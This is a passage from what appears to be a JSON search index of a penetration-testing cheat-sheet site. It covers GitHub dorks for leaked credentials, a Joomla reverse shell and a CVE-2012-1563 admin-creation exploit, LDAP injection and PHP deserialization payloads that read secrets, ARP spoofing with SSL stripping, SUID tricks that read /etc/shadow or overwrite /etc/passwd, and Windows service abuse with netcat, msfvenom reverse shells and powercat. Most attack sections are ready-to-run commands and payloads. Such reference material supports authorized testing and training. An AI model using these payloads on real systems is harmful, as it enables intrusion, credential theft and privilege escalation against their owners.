	"content": " Github Dorks https://gist.github.com/jhaddix/77253cea49bf4bd4bfd5d384a37ce7a4 # Github dorks work a lot with filename and extension # You can build search like this filename:bashrc extension:pem langage:bash # Possible to search terms and use these keywords # Some usefull examples extension:pem private # Private SSH Keys extension:sql mysql dump # MySQL dumps extension:sql mysql dump password # MySQL dumps with passwords filename:wp-config.php # Wordpress config file filename:.htpasswd # .htpasswd filename:.git-credentials # Git stored credentials filename:.bashrc password # .bashrc files containing passwords filename:.bash_profile aws # AWS keys in .bash_profiles extension:json mongolab.com # Keys/Credentials for mongolab HEROKU_API_KEY language:json # Heroku API Keys filename:filezilla.xml Pass # FTP credentials filename:recentservers.xml Pass # FTP credentials filename:config.php dbpasswd # PHP Applications databases credentials shodan_api_key language:python # Shodan API Keys (try others languages) filename:logins.json # Firefox saved password collection (key3.db usually in same repo) filename:settings.py SECRET_KEY # Django secret keys (usually allows for session hijacking, RCE, etc)"
},
{
	"uri": "/web-pentest/content-management-system-cms/joomla/",
	"title": "Joomla!",
	"tags": [],
	"description": "",
	"content": " Scanning and Enumeration # Get components running on the website joomscan --url http://10.10.10.150/ --random-agent --enumerate-components # You can also check /administrator/manifests/files/joomla.xml # If you find components, you can often access the configuration file # JCE component → /components/com_jce/jce.xml # Check for vulnerabilities affecting components # Joomlavs is also a good scanning tool https://github.com/rastating/joomlavs \nReverse Shell # You must first log as admin # Then you must activate the PHP extension in settings System → Component → Media → “php” in legal extensions and nothing in ignored extension # If it\u0026#39;s not enough and the manager is detecting malicious PHP upload, you can still edit templates # For example, the /index.php on the “protostar\u0026#34; template → Use reverse shell from pentestmonkey → http://pentestmonkey.net/tools/web-shells/php-reverse-shell # On old versions, the control panel and features are different, but you can use templates # First go into templates parameters and activate preview # Then, on one template it is possible to edit code # Then it is possible to add shell (weevely for example) \nCVE-2012-1563 # Exploit against Joomla! \u0026lt;= 2.5.2 # Admin account creation # Some online exploits exists but it possible to exploit it manually # First, fill the registration form using 2 differents passwords # Intercept the request and add the following parameter : \u0026amp;jform[groups][]=7 (jform%5Bgroups%5D%5B%5D=7) # Forward the request → Fail because of different passwords # Now just retry to fill, using 2 valid passwords, without intercept # The parameter will be cached and the account will be created as admin !"
},
{
	"uri": "/web-pentest/injections/server-side-injections/ldap/",
	"title": "LDAP Injections",
	"tags": [],
	"description": "",
	"content": " Basic LDAP Injection # Classical request : (\u0026amp;(uid=)(userPassword=)) # So result is TRUE if uid AND userPassword are true # You can put ‘)’ in request to crash and see the request username : *)(|(uid=* password : ) → (\u0026amp;(uid=*)(|(uid=*)(userPassword=))) OR username=* password=*)(\u0026amp; → (\u0026amp;(uid=*)(userPassword=*)(\u0026amp;)) \nBlind LDAP Injection # You have to find/imagine how is the request built # test using only a char → OK → request is (mail=*[texte]*) # You can try (mail=*)(sn=*) → )(sn= → OK # Then, the password attribute (mail=*)(password=*) → OK @*)(password=x → FALSE @*)(password=d → TRUE # You can the enumerate each char"
},
{
	"uri": "/network/mac_arp/",
	"title": "MAC &amp; ARP",
	"tags": [],
	"description": "",
	"content": " MAC Filtering Ethernet sudo macchanger -a eth0 WiFi sudo airmon-ng start wlan0 $ airodump-ng –c [channel]–bssid [target router MAC Address]–i wlan0mon # Trouver des MAC whitelisted sudo airmon-ng stop wlan0mon sudo ifconfig wlan0 down sudo macchanger -m [New MAC Address] wlan0 sudo ifconfig wlan0 up \nARP Spoofing # Old technique but still usable sometimes # You can spoof ARP trafic in order to discover new machines # If you are pivoting through a machine, you may need to upload arpspoof on the target scp /usr/sbin/arpspoof user@ip:/tmp # Then, you may need to identify and upload specific librairies # WARNING : It can be dangerous for target ldd /usr/sbin/arpspoof scp \u0026lt;path\u0026gt; user@ip:/tmp export LD_PRELOAD=./libnet.so.1 # Then you can exploit on the target # Example, spoof a gateway to discover a DC arpspoof -i eth1 -t \u0026lt;victim\u0026gt; \u0026lt;impersonated machine\u0026gt; # Terminal 2 tcpdump -i eth1 -A tcp port 143 or port 25 \nARP Spoofing using Bettercap # Activate router mode on attacker machine echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward # Show machines in the LAN \u0026gt; net.show # Set target for ARP spoofing \u0026gt; set arp.spoof.targets 192.168.5.99 # Launch attack \u0026gt; arp.spoof on Proxy MiTM using Bettercap # Configure sniffer verbosity \u0026gt; set net.sniff.verbose false \u0026gt; net.sniff on # Then set the SSL proxy (It will create an autogenerated SSL cert) \u0026gt; set http.proxy.sslstrip true \u0026gt; http.proxy on"
},
{
	"uri": "/cryptography/misc/",
	"title": "MISC",
	"tags": [],
	"description": "",
	"content": " XOR Encryption https://github.com/hellman/xortool https://github.com/tomchop/unxor \nGPG Encryption sudo gpg --decrypt /mnt/media/dir2/findme.txt.gpg"
},
{
	"uri": "/other-systems/misc/",
	"title": "MISC",
	"tags": [],
	"description": "",
	"content": " RTSP and VLC # RTSP (Real Time Streaming Protocol) is used with IP camera # You can view it from VLC Media Player # Open Network Stream \u0026gt; rtsp://ip/endpoint"
},
{
	"uri": "/web-pentest/injections/client-side-injections/misc_others/",
	"title": "MISC &amp; Others",
	"tags": [],
	"description": "",
	"content": " Cross Origin Resource Sharing (CORS) https://portswigger.net/web-security/cors # CORS is a feature allowing access to resources hosted on different domains # If badly configured, it can allow cross-domain attacks like CSRF# Corsy is an automated tool to discover potential CORS misconfiguration and issues https://github.com/s0md3v/Corsy # Usage $ python3 corsy.py -u https://haax.fr ＣＯＲＳＹ {v0.2-beta} [+] Misconfiguration found! [!] Title: Wildcard value [!] Description: This host allows requests made from any origin. However, browsers will block all requests to this host by default. [!] Severity: Low [!] Exploitation: Not possible"
},
{
	"uri": "/network/",
	"title": "Network",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/omnibus/",
	"title": "Omnibus",
	"tags": [],
	"description": "",
	"content": " General Informations https://github.com/InQuest/omnibus # An Omnibus is defined as a volume containing several novels or other items previously published separately # and that is exactly what the InQuest Omnibus project intends to be for Open Source Intelligence collection, research, and artifact management. # By providing an easy to use interactive command line application, users are able to create sessions to investigate various artifacts such as # IP addresses, domain names, email addresses, usernames, file hashes, Bitcoin addresses, and more as we continue to expand. # This project has taken motivation from the greats that came before it such as SpiderFoot, Harpoon, and DataSploit # API keys /projectfolder/etc/apikeys.json # In CLI \u0026gt; cat apikeys \nVocabulary - Artifact: → An item to investigate → Artificats can be created in two ways:• Using the “new” command or by being discoverd through module execution - Session: → Cache of artifacts created after starting the Omnibus CLI → Each artifact in a session is given an ID to quickly identify and retrieve the artifact from the cache → Commands can be executed against an artifact either by providing it\u0026#39;s name or it\u0026#39;s corresponding session ID - Module: → Python script that performs some arbitirary OSINT task against an artifact \nCommands # Main commands are - session - cat - open - new - find | Command | Description | | session | Start a new session | | new \u0026lt;artifact\u0026gt; | Create a new artifact for investigation | | modules | display a list of available modules | | open \u0026lt;file path\u0026gt; | load a text file list of artifacts into Omnibus as artifacts | | ls | show all active artifacts | | rm | remove an artifact from the database | | wipe | clear the current artifact session | | cat \u0026lt;xx\u0026gt; | view beautified JSON database records | | general | overall commands such as help, histiry, quit, set, clear, banner etc. | | artifacts | display commands specific to artifacts and their management | | sessions | display helpful commands around managing sessions | | modules | show a list of all available modules | \nArtifacts # After searching and analyzing, relationships begin to form and you can pivot through connected data points. # These data points are called Artifacts within Omnibus and represent any item you wish to investigate. # One of the following type - IPv4 adress - FQDN - Email address - Bitcoin Address - File Hash (MD5, SHA1, SHA256, SHA512) - User name # Create a new artifact new \u0026lt;artifact-name\u0026gt; # Omnibus will auto detect artifact type # Store a record of the artifact within MongoDB. This record holds the artifact name, type, subtype, module results # source, notes, tags, children information (as needed) and time of creation. # Every time you run a module against a created or stored artifact, the database document will be # updated to reflect the newly discovered information. \nSessions # Sessions are temporary caches created via Redis each time you start a CLI session. # Every time you create an artifact, that artifacts name is added to the Session along with # a numeric key that makes for easy retrieval, searching, and action against the related artifact. # Example # If session is for haax.fr # You can do “virustotal 1” instead of “virustotal haax.fr” # Sessions are here for easy access to artifacts and will be cleared each time you quit the command line session. # If you wish to clear the session early, run the command \u0026#34;wipe\u0026#34; and you\u0026#39;ll get a clean slate. \nModules # Typing the module name will show you the help information # Supported modules - Blockchain.info - Censys, Clearbit, CSIRTG, Cymon - DNS resolution, DShield (SANS ISC) - Full Contact - Geolocation, Github Username Search - HackedEmails.coms, HaveIBeenPwned.com, Hurricane Electrics - IPinfo, IPvoid - Keybase username lookup, - Nmap Scanner - OTX (AlienVault) - PassiveTotal (RiskIQ), PGP Key Search - RSS reader - Shodan - ThreatCrowd, ThreatExpert, Twitter - URLVoid - VirusTotal - Whois, WhoisMind \nMachines # Machines are a simple way to run all available modules for an artifact type against a given artifact. # This is a fast way if you want to gather as much information on a target as possible using a single command. # Run and wait (some minutes) machine \u0026lt;artifact name | session id\u0026gt; # Take care, it returns a large amount of data and child artifacts"
},
{
	"uri": "/web-pentest/php-vulnerabilities/serialization/",
	"title": "PHP Serialization",
	"tags": [],
	"description": "",
	"content": " Resources https://www.owasp.org/index.php/PHP_Object_Injection \nPHP Serialisation (PHP Slim __wakeup) # Context - \\App\\Controller\\Confidential.php $systemCall = new SystemCall(\u0026#39;system(\u0026#34;ls\u0026#34;);\u0026#39;); if($rank === UserRankService::ADMIN_RANK){ $app-\u0026gt;render(\u0026#39;front/confidential.twig\u0026#39;, array(\u0026#39;admin\u0026#39; =\u0026gt; $rank, \u0026#39;systemCall\u0026#39; =\u0026gt; $systemCall)); }else { $app-\u0026gt;redirect(\u0026#39;/connexion\u0026#39;, \u0026#39;/connexion\u0026#39;, 301); }# Context - \\Slim\\Middleware\\SessionCookie.php if ($value) { try { $_SESSION = unserialize($value); } catch (\\Exception $e) { $this-\u0026gt;app-\u0026gt;getLog()-\u0026gt;error(\u0026#39;Error unserializing session cookie value! \u0026#39; . $e-\u0026gt;getMessage()); }# Context - \\App\\Service\\SystemCall.php class SystemCall { public $hook; public $result; function __construct($hook) { $this-\u0026gt;hook = $hook; } function __wakeup() { $this-\u0026gt;result = eval($this-\u0026gt;hook); } function call() { $this-\u0026gt;__wakeup(); } }# You can override the __wakeup() method by crafting your own object and then inject it to execute command # The cookie value is unserialized and then evaluated # Base cookie a:2:{s:10:\u0026#34;slim.flash\u0026#34;;a:0:{}s:11:\u0026#34;Utilisateur\u0026#34;;i:0;} # Create object to see what it looks like \u0026lt;?php class SystemCall { private $hook = \u0026#34;phpinfo();\u0026#34;; } print urlencode(serialize(new SystemCall)); ?\u0026gt; # Object you want to inject O:22:\u0026#34;App\\Service\\SystemCall\u0026#34;:2:{s:4:\u0026#34;hook\u0026#34;;s:32:\u0026#34;system(\u0026#34;cat /var/www/app/.env\u0026#34;);\u0026#34;;s:6:\u0026#34;result\u0026#34;;N;} # Final cookie (URL encode it) a:3:{s:10:\u0026#34;slim.flash\u0026#34;;a:0:{}s:3:\u0026#34;Lol\u0026#34;;O:22:\u0026#34;App\\Service\\SystemCall\u0026#34;:2:{s:4:\u0026#34;hook\u0026#34;;s:32:\u0026#34;system(\u0026#34;cat /var/www/app/.env\u0026#34;);\u0026#34;;s:6:\u0026#34;result\u0026#34;;N;}s:11:\u0026#34;Utilisateur\u0026#34;;i:0;} # You can simplify it # You only need a string to initialize the object (to name it) # The array is not necessary # As long as you don\u0026#39;t need to be admin, you can remove the user part a:1:{s:10:\u0026#34;slim.flash\u0026#34;;O:22:\u0026#34;App\\Service\\SystemCall\u0026#34;:1:{s:4:\u0026#34;hook\u0026#34;;s:32:\u0026#34;system(\u0026#34;cat /var/www/app/.env\u0026#34;);\u0026#34;;}} \nPHP Serialisation # Unserialize() is used to store every object as a string # Initial cookie unserialized \u0026#39;a:2:{s:5:\u0026#34;login\u0026#34;;s:5:\u0026#34;guest\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:64:\u0026#34;84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec\u0026#34;;}\u0026#39; # Code if ($data[\u0026#39;password\u0026#39;] == $auth[ $data[\u0026#39;login\u0026#39;] ] ) { $_SESSION[\u0026#39;login\u0026#39;] = $data[\u0026#39;login\u0026#39;]; # Payload cookie (using a boolean) \u0026#39;a:2:{s:5:\u0026#34;login\u0026#34;;s:10:\u0026#34;superadmin\u0026#34;;s:8:\u0026#34;password\u0026#34;;b:1;}\u0026#39;"
},
{
	"uri": "/linux-systems/programing-languages/perl/",
	"title": "Perl",
	"tags": [],
	"description": "",
	"content": "# Perl command injection # open() function is vulnerable and can be used to execute commands # ex : “| shutdown -r |”"
},
{
	"uri": "/open-source-intelligence-osint/company_investigations/documents_metadata/",
	"title": "Public Documents and Metadata",
	"tags": [],
	"description": "",
	"content": " Online Resources https://www.documentcloud.org \nMetagoofil # Extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites # The tool first perform a query in Google requesting different filetypes that can have useful metadata (pdf, doc, xls,ppt,etc) # Then will download those documents to the disk and extracts the metadata of the file using specific libraries for # parsing different file types (Hachoir, Pdfminer, etc) # Options # -d: domain to search # -t: filetype to download (pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx) # -l: limit of results to search (default 200) # -h: work with documents in directory (use \\\u0026#34;yes\\\u0026#34; for local analysis) # -n: limit of files to download # -o: working directory (location to save downloaded files) # -f: output file metagoofil.py -d domain.com -t doc,pdf -l 10 -n 10 -o /tmp/result -f /tmp/result/result.html \nInvestigate Powerpoint Documents https://medium.com/@osint/powerpoint-what-data-is-beneath-the-surface-2eb000ef95fb https://medium.com/week-in-osint/week-in-osint-2020-21-4c92d335116a # You can potentially get lots of data from PPTX files # 1/ Obvious metadate such as author # 2/ But also from embedded content such as screenshots # - Some people often use shapes to hide content. If you can edit, you can delete them and get the content # - \u0026#34;Crop\u0026#34; feature can also be used to get the full content of a screenshot # You can also simply unpack the whole document (if using Open XML Format) and get the embedded content \nTruffleHog # Searches through git repositories for secrets, digging deep into commit history and branches. # This is effective at finding secrets accidentally committed. https://github.com/dxa4481/truffleHog truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git truffleHog --json --max_depth 10 https://github.com/dxa4481/truffleHog.git \nJust-Metadata # Collect metadata about IP # You have two main functionnalities divided into modules (gather and analyze) # Load IP file [\u0026gt;] load /path/to/ip.txt # List all the gather modules [\u0026gt;] list gather # You can then user the gather command to collect from any source # Shodan is the only module that requires an API key (Just-Metadata/module/intelgathering/get_shodan.py) [\u0026gt;] gather [\u0026gt;] gather shodan # List all the analysis modules [\u0026gt;] list analysis # Then you can use the analyze command [\u0026gt;] analyze geoinfo # You can get all gathered info about one IP with the following [\u0026gt;] ip_info \u0026lt;ip\u0026gt; # You can save your result to use it later [\u0026gt;] save [\u0026gt;] import /path/to/file.state"
},
{
	"uri": "/linux-systems/privilege-escalation/suid/",
	"title": "SUID Files",
	"tags": [],
	"description": "",
	"content": " /usr/bin/cp # cp -- Il cp is SUID, you can copy privilegied files to /tmp and read them cp /etc/shadow /tmp # generate new account openssl passwd -1 -salt username password # Then create a fake /etc/passwd file, upload it to the target and cp wget http://192.168.1.111:8000/passwd cp passwd /etc/passwd \n/usr/bin/doas # doas cat /etc/doas.conf doas /usr/bin/less /var/log/authlog # Press v to escape vi then :!sh \n/usr/bin/find # find touch raj find raj -exec \u0026#34;whoami\u0026#34; \\; find raj -exec \u0026#34;/bin/sh\u0026#34; \\; # another method find /home –exec chmod u+s /usr/bin/wget \\; ls –la /usr/bin/wget cat /etc/passwd # then create another etc/passwd file and upload it \n/usr/bin/micro # micro editor cat /etc/passwd | /usr/bin/micro # Then generate another user openssl passwd -1 -salt user3 pass123 \n/usr/bin/mawk # mawk mawk \u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39; \n"
},
{
	"uri": "/web-pentest/resources-discovery/known_endpoints/",
	"title": "Sensitive Endpoints",
	"tags": [],
	"description": "",
	"content": " Apache Server Status # Apache server-status is an Apache monitoring instance # Available by default at http://example.com/server-status. # In normal cases, the server-status instance is not accessible by non-local IPs. # However, due to misconfiguration, it can be publicly accessible. # This leads anyone to view the great amount of data by server-status. # Data exposed : # - All URL requested by all hosts/vhosts, including obscure files/directories and session tokens # - All requested client\u0026#39;s IPs # Monitoring and exploiting Server Status https://github.com/mazen160/server-status_PWN python server-status_PWN.py --url \u0026#39;http://example.com/server-status\u0026#39; \n"
},
{
	"uri": "/windows-systems/privilege-escalation/services_scheduled_tasks/",
	"title": "Services &amp; Scheduled Tasks",
	"tags": [],
	"description": "",
	"content": " Services # Query one service sc qc Spooler # Check permissions accesschk.exe -ucqv Spooler C:\\\u0026gt; accesschk.exe -uwcqv \u0026#34;Authenticated Users\u0026#34; * RW SSDPSRV SERVICE_ALL_ACCESS RW upnphost SERVICE_ALL_ACCESS accesschk.exe -ucqv SSDPSRV accesschk.exe -ucqv upnphost # Search for specific service (looking for write permissions) sc qc upnphost # Following rights can give a SYSTEM shell SERVICE_CHANGE_CONFIG (Can reconfigure the service binary) WRITE_DAC (Can reconfigure permissions, leading to 1) WRITE_OWNER (Can become owner and reconfigure permissions) GENERIC_WRITE (Inherits SERVICE_CHANGE_CONFIG) GENERIC_ALL (Inherits SERVICE_CHANGE_CONFIG) # Exploit a vulnerable service (or adding new user) sc config upnphost binpath= \u0026#34;C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe\u0026#34; sc config upnphost obj= \u0026#34;.\\LocalSystem\u0026#34; password= \u0026#34;\u0026#34; sc qc upnphost net start upnphost # You can use subinacl.exe to check vulnerable service permissions subinacl.exe /keyreg \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Vulnerable Service\u0026#34; /display # If you have full control over a registry key, you can override it msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe reg add \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Vulnerable Service\u0026#34; /t REG_EXPAND_SZ /v ImagePath /d \u0026#34;C:\\Users\\testuser\\AppData\\Local\\Temp\\Payload.exe\u0026#34; /f shutdown /r /t 0 # MSF module exploit/windows/local/service_permissions # Exploiting service with write permissions # You want to have (F) or (C) rights C:\\path\\to\\file.exe BUILTIN\\Users:F BUILTIN\\Power Users:C BUILTIN\\Administrators:F NT AUTHORITY\\SYSTEM:F # Then you can add your own binary #include \u0026lt;stdlib.h\u0026gt; int main () { int i; i = system(\u0026#34;net localgroup administrators theusername /add\u0026#34;); return 0; } # Compile it i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe # And restart the service wmic service NAMEOFSERVICE call startservice net stop [service name] \u0026amp;\u0026amp; net start [service name]echo %path% # Check permissions for a service in PAth accesschk.exe -dqv \u0026#34;C:\\Python27\u0026#34; cacls \u0026#34;C:\\Python27\u0026#34; # Need to check the IKEEXT service sc qc IKEEXT # If all conditions are met, you can craft a shell msfpayload windows/shell_reverse_tcp lhost=\u0026#39;127.0.0.1\u0026#39; lport=\u0026#39;9988\u0026#39; O msfpayload windows/shell_reverse_tcp lhost=\u0026#39;127.0.0.1\u0026#39; lport=\u0026#39;9988\u0026#39; D \u0026gt; /root/Desktop/evil.dll # Then upload it and rename it copy evil.dll C:\\Python27\\wlbsctrl.dll dir C:\\Python27 # Then system reboot # DLL Hijacking other methods msf\u0026gt; search -f Vulnerable.exe msf\u0026gt; download Vulnerable.exe # You can use procmon to check missing DLL (add Process Name, Result, Name) # Then msf\u0026gt; search -f hijackable.dll \nScheduled Tasks # Scheduled Tasks # For example, a TFTP server Task To Run: E:\\GrabLogs\\tftp.exe 10.1.1.99 GET log.out E:\\GrabLogs\\Logs\\log.txt # Check rights for the folder accesschk.exe -dqv \u0026#34;E:\\GrabLogs\u0026#34; dir \u0026#34;E:\\GrabLogs\u0026#34; # If running as SYSTEM and write permissions for users, you can craft a payload msfpayload windows/shell_reverse_tcp lhost=\u0026#39;127.0.0.1\u0026#39; lport=\u0026#39;9988\u0026#39; O msfpayload windows/shell_reverse_tcp lhost=\u0026#39;127.0.0.1\u0026#39; lport=\u0026#39;9988\u0026#39; R | msfencode -t exe \u0026gt; /root/Desktop/evil-tftp.exe # Then copy payload copy evil-tftp.exe E:\\GrabLogs\\tftp.exe# When executing any of the sysinternals tools for the first time the user will be presented with a GUI # pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag # to automatically accept the EULA. accesschk.exe /accepteula ... ... ... # Find all weak folder permissions per drive. accesschk.exe -uwdqs Users c:\\ accesschk.exe -uwdqs \u0026#34;Authenticated Users\u0026#34; c:\\  # Find all weak file permissions per drive. accesschk.exe -uwqs Users c:\\*.* accesschk.exe -uwqs \u0026#34;Authenticated Users\u0026#34; c:\\*.* \nGet Local Privileges back # From https://itm4n.github.io/localservice-privileges/ # Create a scheduled task PS\u0026gt; $TaskAction = New-ScheduledTaskAction -Execute \u0026#34;powershell.exe\u0026#34; -Argument \u0026#34;-Exec Bypass -Command `\u0026#34;. C:\\TOOLS\\powercat.ps1; powercat -l -p 7002 -ep`\u0026#34;\u0026#34; PS\u0026gt; Register-ScheduledTask -Action $TaskAction -TaskName \u0026#34;SomeTask\u0026#34; PS\u0026gt; Start-ScheduledTask -TaskName \u0026#34;SomeTask\u0026#34; # Then connect to the bind shell . .\\powercat.ps1 powercat -c 127.0.0.1 -p 7002 --------------- # In order to get the SeImpersonatePrivilege back, you need to specify it clearly # Create a list of privileges [System.String[]]$Privs = \u0026#34;SeAssignPrimaryTokenPrivilege\u0026#34;, \u0026#34;SeAuditPrivilege\u0026#34;, \u0026#34;SeChangeNotifyPrivilege\u0026#34;, \u0026#34;SeCreateGlobalPrivilege\u0026#34;, \u0026#34;SeImpersonatePrivilege\u0026#34;, \u0026#34;SeIncreaseQuotaPrivilege\u0026#34;, \u0026#34;SeShutdownPrivilege\u0026#34;, \u0026#34;SeUndockPrivilege\u0026#34;, \u0026#34;SeIncreaseWorkingSetPrivilege\u0026#34;, \u0026#34;SeTimeZonePrivilege\u0026#34; # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId \u0026#34;LOCALSERVICE\u0026#34; -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute \u0026#34;powershell.exe\u0026#34; -Argument \u0026#34;-Exec Bypass -Command `\u0026#34;. C:\\TOOLS\\powercat.ps1; powercat -l -p 7003 -ep`\u0026#34;\u0026#34; # Create the task Register-ScheduledTask -Action $TaskAction -TaskName \u0026#34;SomeTask2\u0026#34; -Principal $TaskPrincipal # Start the task Start-ScheduledTask -TaskName \u0026#34;SomeTask2\u0026#34; \n"
},
{
	"uri": "/network/services-enumeration/",
	"title": "Services Enumeration",
	"tags": [],
	"description": "",
	"content": "Check menu on the left for content . .;;............ .. .;;;;::::::::::::.. ':;;:::::::::::: . . ':  "
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/subdomain_discovery/",
	"title": "Subdomain Discovery",
	"tags": [],
	"description": "",
	"content": " Google Dorks \u0026amp; Bing Dorks # Google dorks are usefull for finding new subdomains site:wikipedia.org site:*.wikipedia.org -www -store -jobs -uk # Bing also support dorks and can give others results site: # When you use the Google Dork: site:*.example.com, NEVER forget to check site:*.*.example.com site:*.*.*.example.com # Github dorks also allow to find many subdomains \u0026#34;teslamotors.com\u0026#34; password # ... \nOnline DNS tools and services # VirusTotal runs its own passive DNS replication service # DNS Dumpster can also find large number of sub-domains \nCertificate Transparency # It\u0026#39;s a project started by Google to log and audit SSL/TLS certificates for every CA # Interesting because you can request these certificates using some tools https://crt.sh/ https://censys.io/ https://developers.facebook.com/tools/ct/ https://transparencyreport.google.com/https/certificates # crt.sh also provides public access to their CT logs using postgresql interface psql -h crt.sh -p 5432 -U guest certwatch # Appsecco wrote some scripts to automate these queries https://github.com/appsecco/the-art-of-subdomain-enumeration https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration # You can use ct.py and massdns to find resolvable or not subdomains ./ct.py icann.org | ./bin/massdns -r resolvers.txt -t A -q -a -o -w icann_resolvable_domains.txt - # Another tool is ct-exposer ct-exposer.py -d domain.com \nDNS Enumeration, Bruteforce and Passive Tools # DNSRecon is a powerfull enumeration tool dnsrecon.py -h dnsrecon.py -d domain.fr # You can do dictionnary enumeration # -n : nameserver used # -t : type (brt=brute domain and hosts using a given dictionnary) dnsrecon.py -n ns1.insecuredns.com -d insecuredns.com -D subdomains-top1mil-5000.txt -t brt # dnsenum is another tool dnsenum domain.fr # Subdomains bruteforce python sublist3r.py -d domain.fr # DNS enumeration and information gathering using fierce (not really passiv) fierce -dns domain.fr # Aquatone is also a great tool# Subfinder # Subdomain discovery tool that discovers valid subdomains for websites by using passive online sources.https://github.com/projectdiscovery/subfinder $ subfinder -d freelancer.com -o output.txt $ subfinder -dL domains.txt -oD ~/path/to/output $ cat domains.txt | subfinders -subs# Findomain https://github.com/Findomain/Findomain # Install $ git clone https://github.com/Edu4rdSHL/findomain.git $ cd findomain $ cargo build --release $ sudo cp target/release/findomain /usr/bin/ $ findomain $ findomain -t domain.com# You can also uses ffuf in order to bruteforce for subdomains # Option 1 # Redirecting to the host $ ffuf -u https://mydomain.com -w my_wordlist -H \u0026#34;Host: FUZZ.mydomain.com\u0026#34; # Option 2 # But you\u0026#39;ll have to wait for the timeout $ ffuf -u https://FUZZ.mydomain.com -w my_wordlist \nLinked Discovery (using BurpSuite Pro) https://drive.google.com/file/d/1aG_qqRvNW-s5_8vvPk5rJiMSMeNL2uY9/view # Using the spider, you can find lots of subdomains/roots by browsing the website # Turn off passive scanning # Set scope to advanced control and use \u0026#34;keyword\u0026#34; of target name (not a normal FQDN) (example : \u0026#34;twitch\u0026#34;) # Brows the site then spider all hosts recursively # Export # Select domains in the burp tree # \u0026#34;Engagement Tools\u0026#34; --\u0026gt; \u0026#34;Analyze Target\u0026#34; # Save report as HTML # Copy hosts from the HTML \nOWASP Amass # OWASP Amass tool suite is used to build a network map of the target # It relies for subdomain enumeration on scrapping data-sources, recursive bruteforcing, crawling web services, permuting names and reverse DNS sweeping # Basic use (DNS lookups and name alterations) amass -d example.com # Brute force subdomain enumeration and print data sources and ip for discovered names amass -src -ip -brute -d example.com # Passiv mode amass -passiv -d example.com # Importing Amass results into Maltego amass -src -ip --active -brute -do owasp.json -d owasp.org amass.viz -i owasp.json --maltego owasp.csv → Then import csv files \nSubDomainizer https://github.com/nsonaniya2010/SubDomainizer # SubDomainizer is a tool designed to find hidden subdomains and secrets present in # either webpage, Github, and external javascripts present in the given URL. # This tool also finds S3 buckets, cloudfront URL\u0026#39;s and more from those JS files which # could be interesting like S3 bucket is open to read/write, or subdomain takeover and similar case for cloudfront # To find subdomains, s3 buckets, and cloudfront URL\u0026#39;s for given single URL: python3 SubDomainizer.py -u http://www.example.com # To find subdomains from given list of URL (file given): python3 SubDomainizer.py -l list.txt # To save the results in (output.txt) file: python3 SubDomainizer.py -u https://www.example.com -o output.txt # To give cookies: python3 SubDomainizer.py -u https://www.example.com -c \u0026#34;test=1; test=2\u0026#34; # To scan via github: python3 SubDomainizer.py -u https://www.example.com -o output.txt -gt \u0026lt;github_token\u0026gt; -g # No SSL Certificate Verification: python3 SubDomainizer.py -u https://www.example.com -o output.txt -gt \u0026lt;github_token\u0026gt; -g -k \nKnockpy # Knockpy is a python tool designed to enumerate subdomains on a target # domain through a wordlist. It is designed to scan for DNS zone transfer # and to try to bypass the wildcard DNS record automatically if it is enabled. # Now knockpy supports queries to VirusTotal subdomains, you can set # the API_KEY within the config.json file. # Classic research with internal wordlist knockpy domain.com # Use a specific wordlist knockpy domain.com -w wordlist.txt # Resolve IP knockpy -r domain.com or IP # Save output to CSV knockpy -c domain.com # export in JSON knockpy -j domain.com \nPermutation Scanning # Another technique is to use permutations, alterations and mutations of known subdomains to find new ones # Tools like altdns.py can do that # -i : already known subdomains used in input # -o : file containing a massiv list of permuted subdomains # -w : words usef for permutations # -r : resolve each newly generated subdomain # -s : result for the resolved permuted subdomains altdns.py -i icann.domains -o data_output -w icann.words -r -s results_output.txt  \nAutonomous System (AS) Numbers # You can use ASN to identify netblocks belonging to a company # Resolve the IP of a given domain, using dig or host # Then look for the ASN associated https://asn.cymru.com/cgi-bin/whois.cgi (given an IP address) https://bgp.he.net/ (given a domain name) # Then you can use nmap NSE scripts to find netblocks for an ASN nmap --script targets-asn --script-args targets-asn.asn=17012 \u0026gt; netblocks.txt # You will get range networks on which you can investigate more \nZone Transfer # DNS transaction where a DNS Server gives a full/part copy of it\u0026#39;s zone file to another DNS Server # If bad configuration, anyone can initiate a zone transfer and so access to the zone file dig +multi AXFR @ns1.insecuredns.com insecuredns.com \nSubdomain Takeover # Resource https://www.hackerone.com/blog/Guide-Subdomain-Takeovers# Subjack is a tool used to automate subdomain takeover discovery (https://github.com/haccer/subjack) ./subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl \nDNSSEC Walking # To prove things that do not exist, DNSSEC list all the things that exist # If the list is proven, then everything not listed must not exist # This list is created by the NSEC (or NSEC3) records # Interesting side-effect, it allows anyone to list the zone content by following the linked list of NSEC records. → zone walking # Tools like ldns-walk can exploit this ldns-walk @ns1.insecuredns.com insecuredns.com ldns-walk insecuredns.com # Some DNSSEC zones uses NSEC3 → Hashed domain names to prevent attackers # It\u0026#39;s still possible to collect hashes and crack them # Tools like nsec3walker ./collect icann.org \u0026gt; icann.org.collect cat icann.org.unhash | grep \u0026#34;icann\u0026#34; | awk \u0026#39;{print $2;}\u0026#39; \nProject Collecting Data # Some projects collect data and provide them to the community # 